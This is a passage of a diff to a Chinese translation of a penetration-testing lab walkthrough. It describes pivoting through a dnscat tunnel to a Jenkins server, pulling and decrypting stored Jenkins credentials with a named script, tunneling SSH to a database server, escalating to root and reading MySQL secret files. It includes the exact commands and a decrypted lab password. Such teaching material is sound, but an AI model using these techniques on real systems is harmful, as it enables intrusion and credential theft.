 你花了一些时间在第二个系统上，试着理解它的用途。在四处搜索时，你注意到在 /home 目录中有一个 Jenkins 用户，它引导你识别在端口8080上运行的 Jenkins 服务。我们如何使用浏览器查看 Jenkins 服务器上的内容？这就是 dnscat 的端口转发功能发挥作用的地方。我们需要退出最初的shell，去命令终端。从那里，我们需要设置一个监听器，通过 dnscat 将我们的流量从攻击者机器转发到端口8080上的 Jenkins Box（172.16.250.30)。
 
@@ -1178,11 +1178,11 @@ Escalation 提升 dnscat 权限：
 - 在你的 Kali 虚拟机上，使用我们的端口转发代理打开浏览器并打开下面的地址（这将比 dns 慢一些）：
   - http://127.0.0.1:8080/jenkins
 
-![](img/chapter_4/4-58.png)
+![](img/4-58.png)
 
 在 Jenkins 应用程序内的凭证管理器内部，我们将看到 db_backup 用户密码已存储，但不可见。 我们需要弄清楚如何从 Jenkins 中获取此凭据，以便我们可以继续横向移动。
 
-![](img/chapter_4/4-59.png)
+![](img/4-59.png)
 
 n00py 对 Jenkins 中存储的凭据以及如何提取它们做了一些很好的研究（ http://bit.ly/2GUIN9s ）。 我们可以使用现有的 shell 来利用此攻击并获取 credentials.xml，master.key 和 hudson.util.Secret 文件。
 
@@ -1204,7 +1204,7 @@ n00py 对 Jenkins 中存储的凭据以及如何提取它们做了一些很好�
 - 使用 https://github.com/cheetz/jenkins-decrypt 解密密码
   - python3 ./decrypt.py master.key hudson.util.Secret credentials.xml
 
-![](img/chapter_4/4-60.png)
+![](img/4-60.png)
 
 我们能够成功解密 db_backup 用户的密码 `)uDvra{4UL^;r？*h`。如果我们回顾一下之前的注释，我们会在 OpenCMS 属性文件中看到数据库服务器位于 172.16.250.50。看起来这个 Jenkins 服务器出于某种原因会对数据库服务器执行某种备份。让我们检查一下我们是否可以获取 db_backup 的凭据：利用 `)uDvra{4UL^;r？*h` 通过 SSH 登录数据库服务器。唯一的问题是通过我们的 dnscat shell，我们没有直接按标准输入（STDIN）来与 SSH 的密码提示进行交互。 因此，我们将不得不再次使用我们的端口将我们的 SSH shell 从 Kali 虚拟机通过 dnscat 代理传递到数据库服务器（172.16.250.50）。
 
@@ -1214,17 +1214,17 @@ n00py 对 Jenkins 中存储的凭据以及如何提取它们做了一些很好�
 - 创建一个新的端口转发，从 localhost 转到172.16.250.50的数据库服务器
   - listen 127.0.0.1:2222 172.16.250.50:22
 
-![](img/chapter_4/4-61.png)
+![](img/4-61.png)
 
 一旦使用 db_backup 帐户进入数据库服务器（172.16.250.50），我们会注意到此帐户是 sudoers 文件的一部分，并且可以 sudo su 到 root。 一旦 root 在数据库服务器上，我们将四处寻找也找不到任何访问数据库的凭据。我们可以重置 root 数据库密码，但最终可能会破坏其他一些应用程序。相反，我们搜索位于/var/lib/mysql 下的不同数据库，并发现 cyberspacekittens 数据库。在这里，我们找到 secrets.ibd 文件，其中包含 secrets 表的所有数据。在我们阅读数据时，我们意识到它可能是加密的...由你来执行剩下的操作...
 
-![](img/chapter_4/4-62.png)
+![](img/4-62.png)
 
 恭喜！！！你已成功入侵 Cyber Space Kittens 网络！
 
 不要止步于此...你可以用这些系统做很多事情；我们现在只触及了表面。随意在被入侵的系统上翻阅，找到更敏感的文件，找出其他权限升级的方法，等等。作为参考，在本实验中，环境拓扑如下所示：
 
-![](img/chapter_4/4-63.png)
+![](img/4-63.png)
 
 ## 本章总结
 在本章中，我们经历了入侵网络的一系列操作。 我们开始在外部网络上没有任何凭据或利用社会工程的方式入侵到我们的第一个受害者系统。从那里开始，我们能够利用目标系统本身的应用程序，获取有关网络和主机系统的信息，横向移动，权限提升，并最终攻陷整个网络。这一切都是建立在最少程度的扫描，利用网络特性，并试图逃避所有检测机制之上完成的。
